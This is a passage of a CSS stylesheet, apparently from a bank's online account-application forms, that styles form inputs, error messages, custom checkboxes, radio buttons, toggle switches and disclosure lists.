        -ms-transform: rotate(45deg);
        -o-transform: rotate(45deg);
        transform: rotate(45deg);
    }

    .invalidclose::after {
        -webkit-transform: rotate(-45deg);
        -moz-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
        -o-transform: rotate(-45deg);
        transform: rotate(-45deg);
    }

.checkmark {
    display: inline-block;
    margin-left: -8px;
    padding-right: 4px;
}

.tickmark {
    display: inline-block;
    padding-right: 4px;
}

    .tickmark:after {
        /*Add another block-level blank space*/
        content: '';
        display: block;
        /*Make it a small rectangle so the border will create an L-shape*/
        width: 4px;
        height: 8px;
        /*Add a white border on the bottom and left, creating that 'L' */
        border: solid #028477;
        border-width: 0 2px 2px 0;
        /*Rotate the L 45 degrees to turn it into a checkmark*/
        transform: rotate(45deg);
    }

    .tickmark.rounded::before, .tickmark.rounded::after {
        border-radius: 2px 2px 2px 2px;
    }

.valid {
    color: #028477;
}

.invalid {
    color: #DB0018;
}

.checkmark:after {
    /*Add another block-level blank space*/
    content: '';
    display: block;
    /*Make it a small rectangle so the border will create an L-shape*/
    width: 4px;
    height: 8px;
    /*Add a white border on the bottom and left, creating that 'L' */
    border: solid #028477;
    border-width: 0 2px 2px 0;
    /*Rotate the L 45 degrees to turn it into a checkmark*/
    transform: rotate(45deg);
}

.checkmark.rounded::before, .checkmark.rounded::after {
    border-radius: 2px 2px 2px 2px;
}

.full-input-default {
    width: 100%;
    height: 40px;
    display: inline-block;
    padding: 3px;
    border: 1px solid #CFCFCF;
    border-radius: 4px 4px 4px 4px;
    position: relative;
    margin: auto;
}

    .full-input-default .input {
        width: 95%;
        height: 100%;
        margin-top: 0;
        margin-left: 13px;
        outline: none;
        border: none;
        display: block;
        line-height: 1.2em;
    }

    .full-input-default .margin-top-textbox-link {
    }

    .full-input-default label {
        display: none;
    }

    .full-input-default .rightlink {
        display: none;
    }

.full-input {
    width: 100%;
    height: 40px;
    padding-top: 11px;
    display: inline-block;
    padding: 3px;
    border: 1px solid #005EAD;
    border-radius: 4px 4px 4px 4px;
    position: relative;
    margin: auto;
}

    .full-input .form-control:focus {
        box-shadow: none;
    }

    .full-input .input {
        width: 95%;
        height: 15px;
        margin-top: -5px;
        margin-left: -3px;
        outline: 0;
        border: 0;
        display: block;
        line-height: 1.2em;
    }

    .full-input .margin-top-textbox-link {
        margin-top: -18px;
    }

    .full-input label {
        display: block;
        margin-right: 20px;
        margin-top: -6px;
        margin-left: 5px;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        width: 80%;
    }

    .full-input .rightlink, .full-input a {
        margin-right: 5px;
        text-align: right;
        /*margin-top: -12px;*/
        font-family: suntrustregular;
        font-size: 12px;
        color: #005EAD;
        text-decoration: none;
    }

.successmessage {
    color: #333333;
    font-family: suntrustregular;
    font-size: 12px;
}

.sub-label {
    color: #C94C06; /* was #ccc - darkened for WCAG AA compliance */
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
}
.bootstrap-radio-sub-label {
    color: #333333; /* was #ccc - darkened for WCAG AA compliance */
    font-size: 16px;
    font-weight: normal;
    line-height: normal;
}
.bootstrap-radio-info-text {
color:#333333;
margin-top:25px;
    font-size: 14px;
    line-height: 16px;
}
.input-label {
    display: inline-block;
    font-weight: bold;
    text-align: left;
    width: 100%;
    padding-top: 11px;
    vertical-align: top;
}

.review-value {
    font-size: 20px;
    padding-top: 0px;
    font-weight: normal;
    word-wrap: break-word;
    max-width: 320px;
}

/* 19 M07 */
.input-row .input-label.empty {
    width: 5%;
}

.input-label.empty + .input-control {
    width: auto;
}

.input-row .input-label.blank {
    margin: 0;
    padding: 0;
    height: 0;
}

.input-row .input-label.top {
    vertical-align: top;
}

.input-row .input-label.middle {
    vertical-align: middle;
}

.input-row .input-label.bottom {
    vertical-align: bottom;
}

.input-row.checkbox-row .input-label {
    padding-top: 10px;
}


.numbered-instructions .input-control, .numbered-instructions .input-text {
    width: 85%;
}

.numbered-instructions .input-row .input-label {
    width: 14%;
}

.input-row .input-label .sub-label {
    color: #C94C06; /* was #ccc - darkened for WCAG AA compliance */
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
    display: block;
}

/* hide the sub-labels in locked down input rows */
.input-row.locked .input-label .sub-label {
    display: none;
}
/* style the values in locked down input rows to look like disabled fields */
.input-row.locked .disabled-field-value {
    margin: 0;
    display: inline-block;
    padding: 9px 10px;
    background: #f5f5f5;
    color: #333;
    border: 1px solid #f5f5f5;
    border-radius: 4px;
    font-size: 16px;
    height: 40px;
    width: 60%;
    max-width: 250px;
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis;
}

.bootstrap .disabled-field-value {
    margin: 0;
    display: inline-block;
    padding: 10px 0px 10px 10px;
    background: #f5f5f5;
    color: #333;
    border: 1px solid #f5f5f5;
    border-radius: 4px;
    font-size: 16px;
    height: 40px;
    width: 100%;
    max-width: 550px;
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis;
}

.input-row.locked .input-control:after {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e025";
    color: #ddd;
    font-size: 25px;
    margin: 0 6px;
    position: relative;
    top: -12px;
    left: -5px;
}

.touchdev .input-row.locked .input-control:after {
    top: 0;
}

.input-row.checkbox-row .input-label .sub-label {
    white-space: nowrap;
}

.input-row.hasError .input-error:after {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e003";
    color: #ff3300;
    font-size: 25px;
    margin-right: 6px;
    position: relative;
    top: 3px;
}


.input-row.checksOut .input-conf:after {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f103";
    color: green;
    font-size: 21px;
    margin-right: 6px;
    position: relative;
    top: 5px;
    /* left:-35px; */
}

.input-row.checksOut .conf-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: green;
    margin-left: 10px;
}

.conf-message {
    /* display:none; */
}

.input-control.hasError .error-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: red;
    position: absolute;
    text-align: left;
    padding-left: 15px;
    margin-left: 0px;
    max-width: 195px;
    /* note:  this only works for a short error message of "This field is required."  If we later need longer messages, we need to create a different class, or remove position:absolute */
}

.ownership-error-txt {
    position: relative !important;
}
/*Added for 19.4*/
.input-control .info-message {
    font-size: 1.2rem;
    color: #707070;
    text-align: left;
    margin-left: 0px;
    max-width: 200px;
}


.input-row.hasError .error-message, .hasError .error-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: red;
    margin-left: 10px;
}

.error-message {
    display: none;
}

.text-row {
    margin: 5px 0 5px 39%;
    padding: 0 5px;
}

.sub-text-row, .sub-text {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: 5px 0 5px 40%;
    padding: 0 5px;
}

.note-text {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
}

.sub-text {
    margin: inherit;
    padding: inherit;
}

.input-control .sub-text {
    margin-left: 10px;
}

    .input-control .sub-text#instructions {
        width: 70%;
        -webkit-transition: all 0s;
        transition: all 0s;
    }

.info-text {
    margin-top: 8px;
    font-size: 12px;
    font-size: 1.2rem;
    line-height: 16px;
    line-height: 1.6rem;
    color: #707070;
}
/*
.info-text:before {
	font-family: "olb-icons";
	display: inline-block;
	font-weight: normal;
	font-style: normal;
	text-decoration: inherit;
	content: "\e024";
	vertical-align: text-bottom;
	font-size: 14px;
	font-size: 1.4rem;
	color: #999999;
	margin-right: 5px;
}

removed for misuse 

*/
.addendum-text {
    margin-top: 8px;
    font-size: 14px;
    line-height: 16px;
    color: #707070;
    font-style: italic;
}

.addendum-copy {
    padding: 10px 10px 0 10px;
}

/* make a whole section readonly */
.readonly-section {
    color: #aaa;
}



/* switch-section for ".inline-radio" buttons (ie. yes-no radio buttons either inline or to replace toggles), acceptance-section, and green boxes */


.inline-radio .radio-container {
    display: inline-table;
    margin: 0 25px 0 0;
}

    .inline-radio .radio-container:last-of-type {
        margin-right: 5px;
    }

.switch-section.inline-radio .input-control {
    white-space: nowrap;
}

.switch-section.inline-radio .input-label {
    padding: 10px 0 10px 0;
}

.input-row.inline-radio .input-label {
    padding: 17px 5px 0px 10px;
}

.input-row.inline-radio .input-control .radio-combos {
    max-width: 240px;
    width: 60%;
    display: inline-block;
}

.input-row.inline-radio .input-label .sub-label {
    white-space: nowrap;
    display: inline-block;
}

.confimation-link {
    font-size: 1.5rem;
}

.bootstrap-radio {
    font-size: 31px;
    font-weight: normal !important;
    line-height: 1.5 !important;
}
.bootstrap-radio-container {

padding-top:11px;
text-align:right;
display:inline-block !important;
}
.bootstrap-radio-combos {
float:right;
}
.bootstrap-custom-radio + label {
    padding: 20px !important;
  
}

.bootstrap-radio-container label.content {
    display: inline-block !important;
    position: relative;
   padding: 0px 0px 10px 10px;
    margin-left: 10px;
    top: -10px;
    left: -5px;
    font-size: 18px;
  
}
.bootstrap-custom-radio:checked + label:after {
    content: ' ';
    width: 20px !important;
    height: 20px !important;
    left: 10px !important;
    top: 10px !important;
    border-radius: 50px;
    position: absolute;
    background: rgb(0, 41, 77);
    font-size: 32px;
}
/* Misc modifications to Getting Started page */


#show-hide {
    display: inline-block;
    position: relative;
    font-size: 12px;
    text-decoration: none;
    color: #003871;
    cursor: pointer;
    width: 0;
    height: 0;
    left: -60px;
    padding: 15px;
}
/* 
#show-hide {
    position:relative;   
    display:inline-block;
    padding-top: 0;
    width:0;
    height:0;
    left: -20px;
}

#show-hide:before {
    display:inline-block;
    top: 0px;
    color: #aaa;
    margin: 0 auto;
}
 */

ul#gs-req {
    list-style-type: none;
}

#gs-req.display li, #gs-req.display-tight li {
    /* handle multiline */
    overflow: visible;
    padding-left: 5px;
    position: relative;
    margin-left: 0;
}

    #gs-req.display li:before, #gs-req.display-tight li:before {
        /* your own marker in content */
        font-family: "olb-icons";
        content: "\e006";
        left: 0;
        position: absolute;
        left: -17px;
        top: 4px;
        color: #369;
        font-weight: normal;
        color: #ffa400;
        content: "\e006";
        font-family: olb-icons;
        font-size: 1.2rem;
        font-style: normal;
        font-weight: 400;
        line-height: 1;
        text-decoration: inherit;
    }

.forgot-useridpw {
    padding-top: 0px;
    margin-top: 0px;
    margin-bottom: 20px;
    font-size: 13px;
    position: relative;
    left: 60px;
    top: 0px;
}

.forgot-link {
}
/*
#promocode-section {
    background:#f4f4f4;
    border-radius:3px;
    margin:-27px 10px 10px 10px;
    padding:10px;
}*/

.promocode-trigger {
    color: #003871;
    cursor: pointer;
}

    .promocode-trigger a {
        margin-left: 0;
        padding-top: 50px;
    }

.promocode-trigger-text {
    cursor: pointer;
    color: #003871;
    /* font-weight:bold; */
    text-decoration: underline;
}

#delete-field {
    display: inline-block;
    position: relative;
    left: 5px;
    left: -71px; /* button inside input */
    top: -1px;
    text-decoration: none;
    width: 0;
    height: 0;
}

#df-control {
    display: inline-block;
    position: relative;
    font-size: 12px;
    font-weight: 500;
    text-decoration: none;
    color: #fff;
    border-radius: 4px;
    border: 0px solid #777;
    background: #003871;
    ;
    cursor: pointer;
    line-height: 1;
    padding: 7px 10px 6px 10px;
    text-align: center;
}


.radio-note {
    font-size: 13px;
    font-weight: 500;
    line-height: 1.3;
    color: #999;
    width: 250px;
    margin-top: 5px;
}

#client-yesno {
    margin-top: 5px;
}

    /*
#client-yesno .error-message {
   width:250px;
   margin-left:45px;
}
*/

    #client-yesno .input-error {
        float: left;
        position: relative;
        left: 3px;
    }

    #client-yesno .radio-combos {
        position: relative;
        top: -5px;
    }


.inline-radio .error-message {
    width: 250px;
    margin-left: 10px;
}

#client-yesno.inline-radio .input-error {
    float: none;
    position: auto;
    left: 0;
}

#client-yesno.inline-radio .radio-combos {
    position: auto;
    top: 0;
}


.offer-box {
    padding: 15px 25px;
    margin: 25px 0;
    background: #f4f4f4;
    border-radius: 4px;
    line-height: 1.5;
    font-size: 14px;
    border: 0px solid #eee;
}

/*
.offer-box-copy:before {
    content: "\25BA";
    color:#ccc;
    font-size: 100%;
    display: inline-block;
    pointer-events: none;
    padding:0 10px 0 0;
   
}
*/



.switch-section.modal-affirm {
    background-color: #fff;
    border-radius: 0;
    box-sizing: border-box;
    display: block;
    font-size: 1.5rem;
    margin: 0;
    padding: 1;
    text-align: left;
    width: 100%;
}



/* switch-section, acceptance-section, and green boxes */


/* the "mod-one" class allows us to re-structure the HTML so the "input-control" *follows* the "sub-label" content, thereby making it ADA compliant for screen readers.  Add "mod-one" class to the "switch section" div, then proceed to move the "sub-label" content right below the "input-label" div.  */

.switch-section.mod-one .input-control {
    position: absolute !important;
    top: 18px !important;
    right: 0 !important;
    display: inline-block !important;
    width: 120px !important;
}

.switch-section.mod-one .input-label {
    /* background:yellow;   -- for testing */
    display: block;
    width: -moz-calc(100% - 100px) !important;
    width: -webkit-calc(100% - 100px) !important;
    width: calc(100% - 100px) !important;
}

.switch-section.mod-one {
    position: relative !important;
}

/* end "mod-one" edits */

.tax-id-section {
    margin: 2em 0;
}

.Additionalowners {
    background: #F5F5F5 !important;
    border-radius: 4px;
    box-sizing: border-box;
    padding-left: 40px;
    padding-top: 30px;
    padding-bottom: 30px;
    margin: 1em 0 1em 0 !important;
}

.Additionalowners-label {
    font-size: 1.7rem;
}

.Additionalowners-checklist-label {
    font-size: 1.7rem;
    font-weight: normal;
}

Additionalowners-sub-label {
    font-size: 20px;
    font-weight: bold;
}

.owners-list {
    list-style: none;
    display: flex;
    margin-bottom: 0px !important;
}
/*.Additionalowners .form-input-control  {
    height:56px !important;
    }*/
/*.owners-list>li:nth-child(2) {
    margin-left:10px;
    }*/
.Additionalowners-note .info-text {
    padding-right: 20px;
    padding-top: 10px;
}

.percent-icon {
    font-size: 20px;
    font-weight: bold;
    line-height: 26px;
    position: relative;
    bottom: 35px;
    left: 100px;
}

.owners-list .first-label {
    margin-top: 3px;
}

.mobile-show {
    display: none !important;
}

.mobile-hide {
    display: block !important;
}

.switch-section {
    background-color: rgb(244, 244, 244);
    border-radius: 4px;
    box-sizing: border-box;
    display: block;
    font-size: 1.5rem;
    margin: 1em 0 1em 0;
    padding: 15px 10px;
    text-align: left;
    width: 100%;
}

    .switch-section.owners {
        background-color: rgb(244, 244, 244);
        border-radius: 4px;
        box-sizing: border-box;
        display: block;
        font-size: 1.5rem;
        margin: 1em 0 1em 0;
        padding: 15px 10px;
        text-align: left;
        width: 100%;
    }

/*div.switch-section {
    margin-top: 2em;
}*/

.switch-section .input-control {
    text-align: right;
    padding: 6px 0 0 30px;
    display: table-cell;
    width: 5%;
}

.switch-section .input-label {
    text-align: left;
    font-weight: 700;
    padding: 10px 0;
    display: table-cell;
}

.switch-section .sub-label {
    display: block;
    padding-top: 10px;
    /* margin-right:100px; */
    color: rgb(112, 112, 112);
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
}

.switch-section .sub-label-regular {
    display: block;
    padding-top: 10px;
    /* margin-right:100px; */
    color: rgb(112, 112, 112);
    font-size: 14px;
    font-weight: normal;
    line-height: normal;
}

.switch-section .row-break {
    display: block;
}

.switch-section .input-label.account-name {
    padding: 15px 5px 15px 0;
}

.switch-section .input-label.app-name {
    padding: 15px 15px 15px 10px;
    margin: -17px -10px 0 -10px;
    display: block;
    font-weight: normal;
    font-style: italic;
    text-align: center;
    background: #ededed;
}

.switch-section .input-label.coapp-name {
    padding: 15px 15px 15px 10px;
    margin: 0 -10px 0 -10px;
    display: block;
    font-weight: normal;
    font-style: italic;
    text-align: center;
    background: #ededed;
}

.switch-section .input-label.details {
    text-align: right;
    font-weight: normal;
    padding: 15px 5px 15px 0;
}

.switch-section .input-control.card-select, .switch-section .input-control.cc-select, .switch-section .input-control.state-select, .switch-section .input-control.doctor-select {
    text-align: right;
    padding: 0;
}

    .switch-section .input-control.cc-select select {
        width: 50%;
        min-width: 185px;
        padding-right: 25px;
    }

    .switch-section .input-control.card-select select {
        width: 50%;
        min-width: 150px;
        padding-right: 25px;
    }



    .switch-section .input-control.state-select select {
        width: 50%;
        min-width: 185px;
        padding-right: 25px;
    }

    .switch-section .input-control.doctor-select select {
        width: 50%;
        min-width: 185px;
        padding-right: 25px;
    }

.switch-section .input-control.ownership-select input {
    width: 50%;
    min-width: 80px;
    padding-right: 25px;
}

    .switch-section .input-control.ownership-select input.perc, .switch-section .input-control.ownership-select input.perc-full {
        text-align: right;
        padding-right: 20px;
    }

.hasError .input-control.ownership-select .error-message {
    display: none;
}

.switch-section .input-control div.disabled-field {
    width: 50%;
    min-width: 80px;
    padding-right: 20px;
    text-align: right;
}

.switch-section .input-control.ownership-select input[type="text"]:disabled {
    background: #eee !important;
    color: #aaa !important;
}


.ie .switch-section .input-control.card-select select,
.ie-plus .switch-section .input-control.card-select select,
.ie .switch-section .input-control.cc-select select,
.ie-plus .switch-section .input-control.cc-select select,
.ie .switch-section .input-control.state-select select,
.ie-plus .switch-section .input-control.state-select select,
.ie .switch-section .input-control.doctor-select select,
.ie-plus .switch-section .input-control.doctor-select select {
    padding-right: 0;
}

.ie9 .switch-section .input-control.card-select select,
.ie9 .switch-section .input-control.cc-select select,
.ie9 .switch-section .input-control.state-select select,
.ie9 .switch-section .input-control.doctor-select select {
    padding-right: 0;
    width: 175px;
}


.switch-section .input-control.doctor-select select option,
.switch-section .input-control.state-select select option,
.switch-section .input-control.card-select select option,
.switch-section .input-control.cc-select select option {
    background: #fff;
}

.acceptance-section {
    display: table;
    padding: 1.5em 10px;
    background: #f4f4f4;
    border-radius: 4px;
    margin: 2em 0;
}

    .acceptance-section .input-control {
        display: table-cell;
        width: 55px;
        vertical-align: top;
    }

    .acceptance-section .input-label {
        display: table-cell;
        font-weight: bold;
        padding-right: 10px;
    }

    .acceptance-section input, .acceptance-section label {
        cursor: pointer;
    }

/* Add space to read-disclosure checkboxes to top-align box */
input[type="checkbox"].custom-checkbox.read-disclosure + label {
    margin-bottom: 20px;
}

.disclosure-check {
    /* background-color:#deeefe;  */
}

    .disclosure-check label {
        /* color: #003871;  */
    }

.disclosure-sub-text {
    white-space: nowrap;
    display: block;
    margin-top: -2px;
}

    /* white-on-gray box treatment -->

.disclosure-sub-text .wrapper{
    display:inline-block;  
    font-style:italic;
    font-size:12px;
    font-weight:normal;
    color:#fff;
    background:#a5a5a5;
    border-radius:1px;
    padding:1px 5px; 
    line-height: 17px;      
}
 */

    .disclosure-sub-text .wrapper {
        display: inline-block;
        font-style: normal;
        font-size: 12px;
        font-weight: bold;
        color: #777;
        padding: 0;
        line-height: 17px;
    }


        .disclosure-sub-text .wrapper .verbatim {
            text-transform: uppercase;
        }

        .disclosure-sub-text .wrapper .divider:before {
            content: "\2022";
            padding: 0 3px;
        }

.switch-on.disclosure-check label {
    /* color:#333; */
}

    .switch-on.disclosure-check label.desc .instruction {
        display: none;
    }

.greenbox {
    border: 1px solid rgb(244, 244, 244);
}

.switch-on {
    /* background-color:#eee !important; / gray bg */
}

    .switch-on .checkbox-toggle-on {
        /* background-color:green !important; */
    }

    /* .switch-on label.desc  {
	color:green !important;
    display:block;
    text-align:right;
    font-size:12px;
    -webkit-transition: all 0.5s ease-out;  SAFARI
    transition: all 0.5s ease-out;   

} */

    .switch-on .custom-checkbox:checked + label:after, .switch-on .custom-checkbox:checked + label {
        /* background-color:green !important;
    border-color:green !important; */
        background-color: #003871 !important;
        border-color: #003871 !important;
    }




/* Checkbox TOGGLE SWITCH */


.checkbox-toggle, .checkbox-toggle-disabled {
    background-color: #C94C06;
    width: 80px;
    height: 32px;
    border-radius: 20px;
    position: relative;
    cursor: pointer;
    display: block;
}


    .checkbox-toggle .checkbox-toggle-on-value, .checkbox-toggle-disabled .checkbox-toggle-on-value,
    .checkbox-toggle .checkbox-toggle-off-value, .checkbox-toggle-disabled .checkbox-toggle-off-value {
        display: none;
        line-height: 32px;
        line-height: 3.2rem;
        font-weight: bold;
        font-size: 1.2rem;
        text-align: center;
        color: #ffffff;
        width: 54px;
        height: 32px;
    }

    .checkbox-toggle .checkbox-toggle-switch, .checkbox-toggle-disabled .checkbox-toggle-switch {
        position: absolute;
        top: 3px;
        width: 26px;
        height: 26px;
        border-radius: 50%;
        -webkit-transition: all 100ms ease;
        transition: all 100ms ease;
        background-color: #ffffff;
    }

    .checkbox-toggle .input-checkbox, .checkbox-toggle-disabled .input-checkbox {
        border: 0;
        clip: rect(0 0 0 0);
        height: 1px;
        top: -1px;
        overflow: hidden;
        padding: 0;
        position: absolute;
        width: 1px;
    }

    .checkbox-toggle.checkbox-toggle-on, .checkbox-toggle-disabled.checkbox-toggle-on {
        background-color: #003871;
    }

    .checkbox-toggle.checkbox-toggle-off .checkbox-toggle-off-value, .checkbox-toggle-disabled.checkbox-toggle-off .checkbox-toggle-off-value {
        float: right;
        display: block;
    }

    .checkbox-toggle.checkbox-toggle-off .checkbox-toggle-switch, .checkbox-toggle-disabled.checkbox-toggle-off .checkbox-toggle-switch {
        left: 3px;
    }

    .checkbox-toggle.checkbox-toggle-on .checkbox-toggle-on-value, .checkbox-toggle-disabled.checkbox-toggle-on .checkbox-toggle-on-value {
        float: left;
        display: block;
    }

    .checkbox-toggle.checkbox-toggle-on .checkbox-toggle-switch, .checkbox-toggle-disabled.checkbox-toggle-on .checkbox-toggle-switch {
        left: 51px;
    }


.bigswitch .checkbox-toggle-disabled .checkbox-toggle-on-value, .bigswitch .checkbox-toggle-disabled .checkbox-toggle-on-value,
.bigswitch .checkbox-toggle-disabled .checkbox-toggle-off-value, .bigswitch .checkbox-toggle-disabled .checkbox-toggle-off-value {
    font-size: 1.1rem;
}

.checkbox-toggle-disabled {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0.33);
    opacity: 0.33;
}

/* Custom controls adapted from -  http://www.inserthtml.com/2012/06/custom-form-radio-checkbox/     */
/* Not supported in IE8, need to create ".ie" classes to clawback these styles for lte IE8 and degrade to native controls  */


/* Old Fashioned CHECKBOX */

.custom-checkbox {
    display: inline;
    z-index: -999;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
    opacity: 0;
    overflow: hidden;
    position: absolute;
    left: -99999px;
}

.checkbox-container label {
    cursor: pointer;
}

    .checkbox-container label.content {
        display: inline-block;
        position: relative;
        top: -10px;
        padding: 10px;
    }

#gov-stuff .checkbox-container label.content, #gov-stuff-coapp .checkbox-container label.content {
    display: inline;
    position: relative;
    top: -10px;
    padding: 10px;
}

.custom-checkbox + label {
    background-color: rgb(255, 255, 255);
    border: 1px solid rgb(204, 204, 204);
    border-radius: 4px;
    padding: 16px;
    display: inline-block;
    position: relative;
    cursor: pointer;
}



.custom-checkbox:checked + label {
    background-color: rgb(0, 41, 77);
    border: 1px solid rgb(0, 41, 77);
    color: #99a1a7;
}

    .custom-checkbox:checked + label:after {
        color: rgb(255, 255, 255);
        font-family: "olb-icons";
        content: '\e010';
        width: 16px;
        height: 16px;
        left: 8px;
        top: 7px;
        position: absolute;
        background: rgb(0, 41, 77);
        font-size: 18px;
    }

.disabled.custom-checkbox:checked + label {
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0.33);
    opacity: 0.33;
}

/* Terms and Conditions Checks */

input[type=checkbox].tc-link {
    visibility: hidden;
}

    input[type=checkbox].tc-link:after {
        content: " ";
        display: inline-block;
        margin-left: 10px;
        color: green;
        visibility: visible;
        border: 0;
    }

    input[type=checkbox].tc-link:checked:after {
        color: rgb(23, 136, 23);
        content: "\e010";
        font-family: "olb-icons";
        position: relative;
        top: -3px;
    }


/* Old Fashioned RADIO BUTTONS */

.custom-radio {
    display: inline;
    z-index: -999;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
    opacity: 0;
    overflow: hidden;
    position: absolute;
    left: -99999px;
}

.radio-container label {
    cursor: pointer;
}

.radio-container {
    display: table;
}

    .radio-container label.control {
        top: 10px;
    }

    .radio-container label.content {
        display: table-cell;
        position: relative;
        padding: 0px 0 10px 10px;
    }

.custom-radio + label {
    -webkit-appearance: none;
    background-color: rgb(255, 255, 255);
    border: 1px solid rgb(204, 204, 204);
    border-radius: 50%;
    padding: 16px;
    display: inline-block;
    position: relative;
    cursor: pointer;
}

.custom-radio:checked + label:after {
    content: ' ';
    width: 16px;
    height: 16px;
    left: 8px;
    top: 8px;
    border-radius: 50px;
    position: absolute;
    background: rgb(0, 41, 77);
    font-size: 32px;
}

.custom-radio:checked + label {
    background-color: rgb(255, 255, 255);
    color: #99a1a7;
    border: 1px solid rgb(204, 204, 204);
}

.custom-radio:focus + label {
    border-color: rgb(0, 41, 77);
}

.custom-radio + label:active, .custom-radio:checked + label:active {
}

.radio-sub-text {
    color: rgb(112, 112, 112);
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: 0px 0 10px 40px;
    padding: 0 5px;
}

 .radio-container-bootstrap{
    display: inline;
    margin-right:5px;
}
    .radio-container-bootstrap label.control {
        top: 10px;
    }

    .radio-container-bootstrap label.bootstrap-content {
        display: inline;
        position: relative;
        padding: 0px 0 10px 10px;
        top: -5px;
    margin-left: 10px;
    }


/* Segmented control on Getting Started page */

.segmented {
    display: block;
    margin-top: 0.5em;
}

    .segmented .label {
        background-color: rgb(244, 244, 244);
        border: 1px #fff;
        border-style: solid none solid solid;
        border-bottom: 1px solid #ccc;
        color: #707070;
        cursor: pointer;
        float: left;
        padding: 8px;
        text-align: center;
        display: block;
        width: 33%;
        max-width: 81px;
        font-size: 1.3rem;
    }

    .segmented.business .label {
        width: 50% !important;
        max-width: 121.5px;
    }

    .segmented .label.fat {
        padding: 8px 12.5px;
    }

    .segmented .label.thin {
        padding: 8px 4px;
    }

    .segmented :first-child .label {
        border-radius: 3px 0 0 0;
    }

    .segmented :last-child .label {
        border-radius: 0 3px 0 0;
        border-right-style: solid;
    }

    .segmented input {
        display: inline;
        z-index: -999;
        filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
        opacity: 0;
        overflow: hidden;
        position: absolute;
        left: -99999px;
    }

        .segmented input:checked + .label {
            background-color: #fff;
            color: #333;
            border: 1px solid #ccc;
            border-bottom: 1px solid #fff;
        }

        .segmented input:checked .label {
            padding-top: 10px;
            position: relative;
            top: 1px;
        }



    /* ---------------- */

    .segmented .label {
        background-color: rgb(244, 244, 244);
    }

    .segmented input:checked + span {
        background: #fff;
    }

/* Tutorial modal on Getting Started page */

.web_dialog_overlay {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    height: 100%;
    width: 100%;
    margin: 0;
    padding: 0;
    background: #000;
    opacity: .60;
    filter: alpha(opacity=60);
    -moz-opacity: .60;
    z-index: 9999999999101;
    display: none;
}

.web_dialog {
    display: none;
    position: fixed;
    width: 400px;
    min-height: 400px;
    top: 50%;
    left: 50%;
    margin-left: -200px;
    margin-top: -200px;
    background-color: #fff;
    border: 3px solid #fff;
    border-radius: 4px;
    padding: 20px;
    z-index: 9999999999102;
}


/* authentication section and variants on Getting Started page */

#auth-section.on-top {
    margin: 3em 0 -2em 0;
}


/* Disclosures PDF list and PDF link */

.pdf-content {
}

.pdf-note {
    float: right;
    width: 250px;
    font-style: italic;
    font-size: 1.3rem;
    margin: 0 0 0 0;
    /* background-color: rgb(244, 244, 244); */
    padding: 10px;
    border-radius: 4px;
    color: #C94C06;
}

.disclosure-pdf {
    float: left;
    width: 275px;
}

    .disclosure-pdf ul {
        list-style-type: none;
        margin: 0.5em 0 0 0;
        padding: 0;
    }

    .disclosure-pdf li {
        margin-bottom: 1em;
    }

        .disclosure-pdf li:before, li.pdf-link-bullet:before {
            left: 0;
            content: "\e029";
            font-family: "olb-icons";
            display: inline-block;
            font-weight: normal;
            font-style: normal;
            font-size: 2rem;
            text-decoration: inherit;
            padding-right: .5em;
            color: rgb(187, 7, 6);
        }

a.pdf-link:before {
    content: "\e029";
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    padding: 0 5px 0 4px;
    color: rgb(187, 7, 6);
    white-space: nowrap;
}

li.pdf-link-bullet {
    list-style-type: none;
    padding-top: 1.5em;
    position: relative;
    left: -12px;
}

    li.pdf-link-bullet a {
        position: relative;
        top: -2px;
        font-size: 14px;
    }

.pdfchecked {
    position: relative;
    left: 10px;
    top: -2px;
    transform: rotate(45deg);
    height: 13px;
    width: 8px;
    border-bottom: 3px solid #178817;
    border-right: 3px solid #178817;
}

/* Tax certifications list */


.display-list {
    margin: 1em 0 1em 0;
}

    .display-list li {
        margin-bottom: 1em;
        overflow: visible;
        position: relative;
    }

.tax-id-box {
    display: table;
    background-color: rgb(244, 244, 244);
    width: 100%;
    font-weight: bold;
    padding: 1em 10px;
    border-radius: 4px;
}

    .tax-id-box .name, .tax-id-box .number {
        display: table-cell;
        text-align: center;
    }


/* Lines of Credit Table/List */

.lines-table {
    display: table;
    width: 100%;
}

    .lines-table .row {
        display: table-row;
    }

    .lines-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .lines-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .lines-table .cell.amount,
    .lines-table .cell.last {
        text-align: right;
    }

/* Additional Applicant Table/List */

.additional-applicant-table {
    display: table;
    width: 100%;
}

    .additional-applicant-table .row {
        display: table-row;
    }

    .additional-applicant-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
        padding-left: 0px;
    }

    .additional-applicant-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .additional-applicant-table .cell.last {
        text-align: right;
        padding-right: 0;
    }

